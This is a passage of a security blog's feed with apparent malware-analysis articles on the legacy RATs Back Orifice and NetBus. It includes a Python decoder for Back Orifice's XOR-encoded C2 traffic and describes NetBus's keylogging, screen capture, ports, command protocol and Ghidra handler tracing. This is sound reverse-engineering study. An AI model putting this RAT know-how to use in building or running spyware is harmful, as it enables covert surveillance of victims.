class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import collections<br><br>def decoder(packet):<br>    # Frequency Analysis<br>    payload = packet[8:]<br>    chunks = []<br>    for i in range(0, len(payload) - 3, 4):<br>        chunks.append(tuple(payload[i:i + 4]))<br><br>    most_common = collections.Counter(chunks).most_common(1)<br>    if not most_common:<br>        print(&#x27;[-] Cannot detect the valid key for decoding.&#x27;)<br>        return<br>    <br>    abKey = list(most_common[0][0])<br><br>    key_hex = &#x27; &#x27;.join(f&#x27;&#123;b:02x&#125;&#x27; for b in abKey)<br>    print(f&#x27;[+] Detected key: &#123;key_hex&#125;&#x27;)<br><br>    header = packet[:8]<br>    data = list(header)<br><br>    for i in range(len(payload)):<br>        data.append(payload[i] ^ abKey[i % 4])<br><br>    # Hexdump<br>    print(&#x27;-&#x27; * 50)<br>    for i in range(0, len(data), 16):<br>        chunk = data[i:i+16]<br>        offset = f&quot;&#123;i:04x&#125;&quot;<br><br>        hex_part = &quot; &quot;.join(f&quot;&#123;b:02x&#125;&quot; for b in chunk)<br>        if len(chunk) &gt; 8:<br>            hex_part = hex_part[:23] + &quot;  &quot; + hex_part[24:]<br><br>        ascii_part = &quot;&quot;.join(chr(b) if 32 &lt;= b &lt;= 126 else &quot;.&quot; for b in chunk)<br>        <br>        print(f&quot;&#123;offset&#125;  &#123;hex_part:&lt;48&#125;  |&#123;ascii_part&#125;|&quot;)<br><br>packet = [<br>    # Your packet<br>]<br><br>def main():<br>    decoder(packet)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    main()<br></code></pre></td></tr></table></figure></p><p>Save the result from Wireshark into the Python script:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/13.png'><img src="/images/article/2026-2-18-BackOrifice/13.png" width=700></p><p>Now we can decode the channel successfully:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ python3 decoder.py<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/24.png'><img src="/images/article/2026-2-18-BackOrifice/24.png" width=700></p><h1 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h1><p>First, open the payload executable <code>bok2.exe</code> using <code>ExeInfo</code> and <code>DIE</code> (stands for Detect it Easy):</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/11.png'><img src="/images/article/2026-2-18-BackOrifice/11.png" width=700></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/12.png'><img src="/images/article/2026-2-18-BackOrifice/12.png" width=700></p><p>Both tools indicate that it was compiled using Microsoft Visual C++.</p><p>Next, open <code>bok2.exe</code> with Ghidra:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/13.png'><img src="/images/article/2026-2-18-BackOrifice/13.png" width=1000></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/14.png'><img src="/images/article/2026-2-18-BackOrifice/14.png" width=900></p><p>One lesson I learned here is that the message handler of a payload written in VC++ appears like this in Ghidra:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/25.png'><img src="/images/article/2026-2-18-BackOrifice/25.png" width=800></p><p>How does it works? <code>FUN_0314b6f8</code> acts as a dispatcher function. The second parameter (e.g., FUN_0314xxxx) represents the function that executes the corresponding functionality of the payload.</p><p>For example, let’s jump into the first one (<code>FUN_03141e23</code>):</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/26.png'><img src="/images/article/2026-2-18-BackOrifice/26.png" width=800></p><p>We can find the keyword “Ping”, which corresponds to the first feature provided in the controller GUI:</p><p>The 7-th feature provided in the GUI wizard is <strong>keylogger</strong>, let’s jump into the 7-th function (<code>FUN_031439ed</code>):</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/27.png'><img src="/images/article/2026-2-18-BackOrifice/27.png" width=800></p><p>We can see the keyword “Key_logging”, which confirms my hypothesis.</p><h1 id="Defect"><a href="#Defect" class="headerlink" title="Defect"></a>Defect</h1><p>While analyzing this RAT, I had struggled in several issues. The main issue was an incorrect payload configuration, which led to execution failure. The second issue is related to the “Single User” mechanism, which may lead to situations similar to a deadlock scenario in C++ concurrency programming.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/10.png'><img src="/images/article/2026-2-18-BackOrifice/10.png" width=800></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This article describes the architecture of an infamous remote access Back Orifice from the early 2000s. It provides multiple features for controlling a remote machine. Since it uses direct connections, it can be persumed that it was used for controlling a remote server rather than targeting random users on the internetwork.</p><p>It also provides a GUI wizard for configuring the payload. It is a significant difference between it and the modern RATs. The principle of the configuration functionality is: Static patch, which means it directly modify the PE file.</p><h1 id="Refreence"><a href="#Refreence" class="headerlink" title="Refreence"></a>Refreence</h1><blockquote id="fn_1"><sup>1</sup>. <a href="https://en.wikipedia.org/wiki/Back_Orifice">https://en.wikipedia.org/wiki/Back_Orifice</a><a href="#reffn_1" title="Jump back to footnote [1] in the text."> &#8617;</a></blockquote><blockquote id="fn_2"><sup>2</sup>. <a href="https://en.wikipedia.org/wiki/Microsoft_BackOffice_Server">https://en.wikipedia.org/wiki/Microsoft_BackOffice_Server</a><a href="#reffn_2" title="Jump back to footnote [2] in the text."> &#8617;</a></blockquote><blockquote id="fn_3"><sup>3</sup>. <a href="https://en.wikipedia.org/wiki/Cult_of_the_Dead_Cow">https://en.wikipedia.org/wiki/Cult_of_the_Dead_Cow</a><a href="#reffn_3" title="Jump back to footnote [3] in the text."> &#8617;</a></blockquote><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width=600></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article is part of my ser</summary>
      
    
    
    
    <category term="Studying/RAT" scheme="https://iss4cf0ng.github.io/categories/Studying-RAT/"/>
    
    
    <category term="Studying" scheme="https://iss4cf0ng.github.io/tags/Studying/"/>
    
    <category term="Reverse Engineering" scheme="https://iss4cf0ng.github.io/tags/Reverse-Engineering/"/>
    
    <category term="RAT" scheme="https://iss4cf0ng.github.io/tags/RAT/"/>
    
    <category term="Back Orifice" scheme="https://iss4cf0ng.github.io/tags/Back-Orifice/"/>
    
    <category term="Malware" scheme="https://iss4cf0ng.github.io/tags/Malware/"/>
    
    <category term="Malware Analysis" scheme="https://iss4cf0ng.github.io/tags/Malware-Analysis/"/>
    
  </entry>
  
  <entry>
    <title>[Studying] Analyzing Netbus</title>
    <link href="https://iss4cf0ng.github.io/2026/02/18/2026-2-18-Netbus/"/>
    <id>https://iss4cf0ng.github.io/2026/02/18/2026-2-18-Netbus/</id>
    <published>2026-02-18T08:17:06.000Z</published>
    <updated>2026-02-22T17:21:05.151Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is part of my series: <a href="https://iss4cf0ng.github.io/2026/02/18/2026-2-18-StudyingRAT/">Inside Different Generations of RATs</a>. If you are interested in the full series, please click the mentioned page.</p><p>This article revisits a well-known RAT from the late 1990s and presents a reverse engineering analysis of its architecture and communication protocol.</p><h1 id="Netbus"><a href="#Netbus" class="headerlink" title="Netbus"></a>Netbus</h1><p>NetBus is a remote access tool (RAT) to control Microsoft Windows systems. It was created in 1998 and became controversial due to its potential use as a Trojan horse.</p><p>NetBus was written in Delphi by Carl-Fredrik Neikter. It was in wide circulation before <strong>Back Orifice</strong> was released.</p><p>In modern RAT architecture, the system typically consists of two components: a client and a server. In many contemporary C2 frameworks——such as <strong>Cobalt Strike</strong>, <strong>Armitage</strong> or <strong>United Rake</strong>——the architecture may involve multiple clients connecting to a C2 server. However, in the late 1990s, the “client” refers to the attacker-side controller application, while the “server” refers to the payload installed on the victim machine.</p><p>In this article, the following versions are analyzed:</p><ul><li>NetBus 1.20</li><li>NetBus 1.53</li><li>NetBus 1.70</li><li>NetBus 2.0 Pro</li></ul><h1 id="Experimental-Environment-Setup"><a href="#Experimental-Environment-Setup" class="headerlink" title="Experimental Environment Setup"></a>Experimental Environment Setup</h1><p>To safely conduct malware analysis, the environment should be isolated using virtual machines. Under no circumstances should malware be executed on a personal or production system.</p><div class="table-container"><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td>PETool</td><td>Utility for inspecting and modifying Portable Executable (PE) files, including EXE and DLL modules</td></tr><tr><td>Process Explorer</td><td>Advanced process monitoring tool for examining running processes, loaded DLLs, and system handles</td></tr><tr><td>PEView</td><td>Static analysis tool for examining PE and COFF file structures (EXE, DLL, OBJ, LIB)</td></tr><tr><td>CFF Explorer</td><td>PE file editor and analyzer developed by NTCore, supporting 32-bit/64-bit executables and .NET assemblies</td></tr><tr><td>Wireshark</td><td>Network protocol analyzer used to capture and inspect live or recorded traffic</td></tr><tr><td>Ghidra</td><td>Open-source software reverse engineering framework developed by the NSA</td></tr></tbody></table></div><hr><div class="table-container"><table><thead><tr><th>Device</th><th>IP Address</th><th>Description</th></tr></thead><tbody><tr><td>Windows XP x86 (VM)</td><td>192.168.85.2</td><td>Victim machine used for executing the NetBus server component</td></tr><tr><td>Windows 10 x64 (VM)</td><td>192.168.85.3</td><td>Analyst machine used for reverse engineering and client-side interaction</td></tr></tbody></table></div><p>The two virtual machines were configured within an isolated internal network to prevent unintended external communication.</p><h1 id="NetBus-1-20"><a href="#NetBus-1-20" class="headerlink" title="NetBus 1.20"></a>NetBus 1.20</h1><p>File tree:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">└───Netbus1.20<br>        KeyHook.dll //A DLL file, use with SysEdit.exe<br>        NetBus.exe  //Client, controller<br>        NetBus.rtf  //The README documentation<br>        SysEdit.exe //Server, payload<br></code></pre></td></tr></table></figure></p><p>Features in this version:</p><ul><li>Open/close the CD-ROM once.</li><li>Open/close the CD-ROM in intervals, the time interval is set in seconds.</li><li>Show optional image. The image must exist in the same directory as SysEdit. The supported image-formats is BMP and JPG.</li><li>Swap mouse buttons – the right mouse button gets the left mouse button’s functions and vice versa.</li><li>Start optional application.</li><li>Play optional sound-file. The sound-file must exist in the same directory as SysEdit. The supported sound-format is WAV.</li><li>Point the mouse to optional coordinates. You can even navigate the mouse on the target computer with your own! </li><li>Show a message or question on the screen. Sentence that ends with ”?” gives a question, and a sentence that starts with ”?” gives a dialog-box that the user can give his ”answer” in. The answer is always sent back to you!</li><li>Exit Windows.</li><li>Go to an optional URL within a web-browser.</li><li>Send keystrokes to the active application on the target computer! The text in the field ”Message/text” will be inserted in the application that has focus. (”|” represents enter).</li><li>Listen for keystrokes and send them back to you!</li><li>Get a screendump! (should not be used over slow connections)</li><li>Inform yourself about which user-name the person has logged in with.</li><li>Increase and decrease the sound-volume.</li></ul><p>Let’s attempt to execute <code>NetBus.exe</code> on a Windows 10 system:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/4.png'><img src="/images/article/2026-2-18-Netbus/4.png" width=600></p><p>A VCL Forms application compiled with Delphi is a native Win32 executable built on top of the Win32 API. This explains why a GUI application developed decades ago can still execute on modern Windows 10 systems. This behavior is expected. However, some features may no longer function correctly due to changes in Windows system architecture and security configuration over time. The officially supported operating systems at the time included:</p><ul><li>Windows 95</li><li>Windows 98</li><li>Windows ME</li><li>Windows NT 4.0</li></ul><p>Now let’s take a look at the user interface. In version 1.20, only basic features are available. Some functions no longer operate correctly on modern systems. Overal, this version contains simple features. It does not involve modern features, such as file manager (but version 1.70 does).</p><p>Next, execute <code>SysEdit.exe</code> on Windows XP machine, When executed on a Windows XP system, <code>SysEdit.exe</code> binds to TCP ports 12345 and 12346 to listen for incoming connections. These port numbers appear to be hardcoded and cannot be modified through the interface in this version.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; netstat ano | find &quot;12345&quot;<br></code></pre></td></tr></table></figure></p><p>No firewall warning dialog is triggered on a Windows XP x64 system.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/5.png'><img src="/images/article/2026-2-18-Netbus/5.png" width=1000></p><h2 id="Analyze-the-Protocol"><a href="#Analyze-the-Protocol" class="headerlink" title="Analyze the Protocol"></a>Analyze the Protocol</h2><p>Wireshark filter:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ip.src == 10.98.217.130 || ip.dst == 10.98.217.130<br></code></pre></td></tr></table></figure></p><p>After connecting to the server (<code>SysEdit.exe</code>):</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/6.png'><img src="/images/article/2026-2-18-Netbus/6.png" width=700></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/9.png'><img src="/images/article/2026-2-18-Netbus/9.png" width=700></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/10.png'><img src="/images/article/2026-2-18-Netbus/10.png" width=700></p><p>After TCP handshake, the server notifies the client using a plain text <code>Netbus\r</code>. The structure of the C2 commands is shown below:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/11.png'><img src="/images/article/2026-2-18-Netbus/11.png" width=700></p><p>Port 12345 is used for receiving C2 commands, while port 12346 is dedicated to the “Screen Dump” functionality.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/12.png'><img src="/images/article/2026-2-18-Netbus/12.png" width=700></p><p>The result of ScreenDump——an image——is saved as <code>temp2.jpg</code></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/13.png'><img src="/images/article/2026-2-18-Netbus/13.png" width=700></p><h1 id="NetBus-1-53"><a href="#NetBus-1-53" class="headerlink" title="NetBus 1.53"></a>NetBus 1.53</h1><p>Version 1.53 introduces additional features:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/7.png'><img src="/images/article/2026-2-18-Netbus/7.png" width=700></p><p>New features (Reference: README.txt of this version):</p><ul><li>Upload any file from you to the target computer! With this feature it will be possible to remotely update SysEdit with a new version.</li><li>Record sounds that the microphone catch. The sound is sent back to you!</li><li>Make click sounds every time a key is pressed!</li><li>Download any file from the target. Before you start to download you can select files in a nice view that represents the harddisks on the target!</li></ul><h1 id="NetBus-1-70"><a href="#NetBus-1-70" class="headerlink" title="NetBus 1.70"></a>NetBus 1.70</h1><p>This version contains more features, such as file manager:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/35.png'><img src="/images/article/2026-2-18-Netbus/35.png" width=700></p><h1 id="NetBus-2-0"><a href="#NetBus-2-0" class="headerlink" title="NetBus 2.0"></a>NetBus 2.0</h1><p>Starting from version 2.0, NetBus evolved into a more comprehensive system management application. Both the client and server components require installation and provide GUI-based interfaces.</p><p>This version introduces features that are commonly seen in modern RATs, such as:</p><ul><li>Port forwarding</li><li>Screen capture</li><li>Camera capture</li><li>Registry management</li><li>Plugin management</li></ul><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/36.png'><img src="/images/article/2026-2-18-Netbus/36.png" width=700></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/37.png'><img src="/images/article/2026-2-18-Netbus/37.png" width=300></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/38.png'><img src="/images/article/2026-2-18-Netbus/38.png" width=900></p><p>NetBus 2.0 uses a different protocol:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/39.png'><img src="/images/article/2026-2-18-Netbus/39.png" width=700></p><p>Compared to the 1.x versions, NetBus 2.0 (and 2.1) implements encoded communication within its protocol.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/40.png'><img src="/images/article/2026-2-18-Netbus/40.png" width=700></p><h1 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h1><h2 id="Netbus-1-20"><a href="#Netbus-1-20" class="headerlink" title="Netbus 1.20"></a>Netbus 1.20</h2><p>Open <code>SysEdit.exe</code> (version: 1.20) using <strong>CFF Explorer</strong>. The executable is identified as a 32-bit x64 PE file. Both <code>SysEdit.exe</code> and <code>KeyHook.dll</code> were developed using Delphi.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/8.png'><img src="/images/article/2026-2-18-Netbus/8.png" width=700></p><p>I have previously learned how to use Ghidra and IDA; however, I have not extensively performed malware analysis before. This makes the analysis of this legacy RAT a valuable practical exercise!</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/14.png'><img src="/images/article/2026-2-18-Netbus/14.png" width=900></p><p>Entry Point:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/15.png'><img src="/images/article/2026-2-18-Netbus/15.png" width=900></p><p>No any patch is found:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/17.png'><img src="/images/article/2026-2-18-Netbus/17.png" width=300></p><p>Imports:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/16.png'><img src="/images/article/2026-2-18-Netbus/16.png" width=300></p><p>This application imports libraries like <code>GDI32.dll</code>, <code>USER32.DLL</code>, which demonstrate that it is a WinGUI application——Delphi VCL.</p><p>To locate the <code>WinMain</code> entry point in a Delphi application using Ghidra is relatively straightforward once the Windows GUI execution model is understood. Unlike console applications, Win32 GUI applications enter a message loop and process window message via Win32 APIs such as <code>GetMessage</code> (or <code>PeekMessage</code>) and <code>DispatchMessage</code>.</p><p>By examining references to <code>DispatchMessageA</code> in the import table and tracing its cross-references, we can identify the function responsible for initializing the application.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/22.png'><img src="/images/article/2026-2-18-Netbus/22.png" width=300></p><p>Right-click -&gt; Show Reference To:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/23.png'><img src="/images/article/2026-2-18-Netbus/23.png" width=700></p><p>Right-click -&gt; Show References to <code>DispatchMessageA</code>:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/24.png'><img src="/images/article/2026-2-18-Netbus/24.png" width=700></p><p>Now, we can see a function like this:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/25.png'><img src="/images/article/2026-2-18-Netbus/25.png" width=700></p><p>We can also use <strong>Show Call Tree</strong> to find this function. Now let’s click into <code>FUN_0042c930</code>:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/26.png'><img src="/images/article/2026-2-18-Netbus/26.png" width=700></p><p>The function signature matches the standard Windows definition:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int PASCAL WinMain(<br>    HINSTANCE hInstance, <br>    HINSTANCE hPrevInstance, <br>    LPSTR lpszCmdLine, <br>    int nCmdShow<br>) <br></code></pre></td></tr></table></figure></p><p>This is how we find the <code>WinMain()</code> function.</p><hr><p>To identify the C2 command handler, we can trace calls to the recv function, which is responsible for receving data from the attacker.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/27.png'><img src="/images/article/2026-2-18-Netbus/27.png" width=700></p><p>After stepping through each function within this call chain, the message handler is not immediately visible. In this case, go to the parent function which call <code>FUN_00439b10</code> using <strong>Function Call Tree</strong>:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/27.png'><img src="/images/article/2026-2-18-Netbus/27.png" width=700></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/28.png'><img src="/images/article/2026-2-18-Netbus/28.png" width=700></p><p>From the decompiled code, it can be inferred that <code>local_c</code> stores the pointer to the received buffer. This is the reason why we cannot see any return value relate to the buffer. Let’s go into <code>FUN_00403ac4</code>:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/29.png'><img src="/images/article/2026-2-18-Netbus/29.png" width=700></p><p>We can see that the buffer is now in <code>puVar2</code>. Let’s step into <code>FUN_004026a8</code>:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/30.png'><img src="/images/article/2026-2-18-Netbus/30.png" width=700></p><p>By continuing to trace the execution flow, we eventually located the function responsible for handling incoming commands.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/31.png'><img src="/images/article/2026-2-18-Netbus/31.png" width=700></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/32.png'><img src="/images/article/2026-2-18-Netbus/32.png" width=700></p><p>An alternative approach is to search for know C2 command strings within the Defined Data section. Since NetBus 1.x uses plain-text commands, locating the handler becomes significantly easier.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/33.png'><img src="/images/article/2026-2-18-Netbus/33.png" width=700></p><p>In contrast, modern RATs typically employ encrypted C2 channels, which significantly increases the complexity of reverse engineering.</p><p>We can also use <strong>Immunity Debugger</strong>(or <strong>OllyDbg</strong>) to find the message handler:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/18.png'><img src="/images/article/2026-2-18-Netbus/18.png" width=700></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/19.png'><img src="/images/article/2026-2-18-Netbus/19.png" width=700></p><p>The <code>KeyHook.dll</code> module implements keylogging functionality.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/34.png'><img src="/images/article/2026-2-18-Netbus/34.png" width=700></p><p>The <code>KeyboardProc</code> callback captures keystrokes, processes them, and transmits the recorded data (key char) back to the attacker.</p><h2 id="NetBus-2-0-1"><a href="#NetBus-2-0-1" class="headerlink" title="NetBus 2.0"></a>NetBus 2.0</h2><p>Tracing the TCP handler in NetBus 2.0 reveals a more structured design compared to version 1.x.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/41.png'><img src="/images/article/2026-2-18-Netbus/41.png" width=700></p><p>By continuing to trace the execution flow, the message handler (<code>FUN_0046e2c8</code>) can be identified. Here, <code>param_2</code> contains the pointer to the received buffer.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/42.png'><img src="/images/article/2026-2-18-Netbus/42.png" width=700></p><p>Compare to version 1.x, NetBus 2.0 and 2.1 introduce significant improvements to the communication protocol. A structed protocol is defined to parse imcoming data.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/43.png'><img src="/images/article/2026-2-18-Netbus/43.png" width=700></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/44.png'><img src="/images/article/2026-2-18-Netbus/44.png" width=700></p><p>Instead of identifying C2 commands using plain-text string, version 2.0 uses integer identifiers to represent command types.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/45.png'><img src="/images/article/2026-2-18-Netbus/45.png" width=700></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/46.png'><img src="/images/article/2026-2-18-Netbus/46.png" width=700></p><p>The authentication function(<code>uVar1 == 5</code>):</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-Netbus/47.png'><img src="/images/article/2026-2-18-Netbus/47.png" width=700></p><p>Other C2 commands follow the same protocol structure.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>One of the characteristics that contributed to the controversial nature of NetBus was its silent execution. Starting from version 2.0, the server component required installation through a GUI-based installer, shifting its presentation closer to that of a remote administration tool.</p><p>From a technical perspective, NetBus 2.0 (and 2.1) represented a significant architectural evolution for its time. It introduced structed protocol handling, plugin-like extensibility, and graphical management features that resemble capabilities found in later-generation RATs.</p><p>This article marks the beginning of this series and also my first attempt at conducting malware analysis using Ghidra. As this is an early work, some parts of the analysis may not be as refined as they could be.  </p><p>Any feedback or suggestions are highly appreciated!</p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width=600></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article is part of my ser</summary>
      
    
    
    
    <category term="Studying/RAT" scheme="https://iss4cf0ng.github.io/categories/Studying-RAT/"/>
    
    
    <category term="Studying" scheme="https://iss4cf0ng.github.io/tags/Studying/"/>
    
    <category term="Reverse Engineering" scheme="https://iss4cf0ng.github.io/tags/Reverse-Engineering/"/>
    
    <category term="RAT" scheme="https://iss4cf0ng.github.io/tags/RAT/"/>
    
    <category term="Malware" scheme="https://iss4cf0ng.github.io/tags/Malware/"/>
    
    <category term="Malware Analysis" scheme="https://iss4cf0ng.github.io/tags/Malware-Analysis/"/>
    
    <category term="Netbus" scheme="https://iss4cf0ng.github.io/tags/Netbus/"/>
    
    <category term="Ghidra" scheme="https://iss4cf0ng.github.io/tags/Ghidra/"/>
    
  </entry>
  
  <entry>
    <title>[Studying] Inside Different Generations of RATs</title>
    <link href="https://iss4cf0ng.github.io/2026/02/18/2026-2-18-StudyingRAT/"/>
    <id>https://iss4cf0ng.github.io/2026/02/18/2026-2-18-StudyingRAT/</id>
    <published>2026-02-18T05:02:44.000Z</published>
    <updated>2026-02-23T10:16:36.958Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>Recently, I have been developing different types of remote access tools (RATs).<br>My interest in RAT development originates from personal curiosity and long-term fascination with how remote control malware works internally.</p><p align="center" class='item-img' data-src='/images/meme/mika_rollcake.png'><img src="/images/meme/mika_rollcake.png" width=200></p><p>Years ago, when I was a begineer in cybersecurity——and by “begineer,” I truly mean knowing almost nothing beyond simple denial-of-service attempts using the <code>ping</code> command in <code>cmd.exe</code>——I used to download numerous tools from various websites. At that time, I barely understood operational security or the risks involved. However, experimenting with existing tools was, in my case, the only accessible way to explore cybersecurity as a middle school student.</p><p>Over the years, my perspective has changed. Instead of merely using tools, I become more interested in understanding how they are designed and implemented. Today, I have published several remote access tools for educational and research purposes, such as <a href="https://github.com/iss4cf0ng/DuplexSpyCS">DuplexSpy</a> and <a href="https://github.com/iss4cf0ng/Eden-RAT">Eden-RAT</a>. Other projects are still under development or being rewritten. </p><p align="center" class='item-img' data-src='/images/meme/mika_baseballbat.png'><img src="/images/meme/mika_baseballbat.png" width=100></p><p>Somebody may ask: why develop multiple RATs? What are the differences? Looking back at 2016, when The Shadow Brokers leaked numerous tools allegedly associated with the National Security Agency <sup><a href="#fn_1" id="reffn_1">1</a></sup>, one important lesson become clear: advanced threat groups often develop multiple implants and remote access tools tailored for different operational stages and objectives.</p><p align="center" class='item-img' data-src='/images/meme/terrible_cake.png'><img src="/images/meme/terrible_cake.png" width=200></p><p>During my own development process, I began recalling the older RATs I had downloaded but never truly understood. Recently, as I have been studying reverse engineering and malware analysis more systemically, I realized this presents and excellent opportunity to revist those historical tools——not to use them, but to analyze and understand their architecture.</p><p>Cybersecurity has gradually become more complex. The number of domains, tools, and technologies continues to grow, while learning resources can feel fragmented. The gap between begineers and experienced professional seems wider than ever. This is one of the reasons I started publishing technical articles on my blog. While blogging may feel somewhat old-school, I prefer structed and long-form documentation of knowledge.</p><p align="center" class='item-img' data-src='/images/meme/koyuki_crying.gif'><img src="/images/meme/koyuki_crying.gif" width=300></p><p>In this series, I will analyze different generations of remote access tools——from <strong>early legacy trojans</strong> to more <strong>modern modular RATs</strong>——focusing on architecture, communication protocols, and design evolution from a reverse engineering perspective.</p><p align="center" class='item-img' data-src='/images/meme/mika_rollcake_hit.png'><img src="/images/meme/mika_rollcake_hit.png" width=300></p><h1 id="Articles"><a href="#Articles" class="headerlink" title="Articles"></a>Articles</h1><p>The table below lists all articles in this series analyzing various remote access tools.<br>It will be updated continuously as new research is published.</p><div class="table-container"><table><thead><tr><th>RAT</th><th>Article</th></tr></thead><tbody><tr><td>Netbus</td><td><a href="https://iss4cf0ng.github.io/2026/02/18/2026-2-18-Netbus/">Analyzing 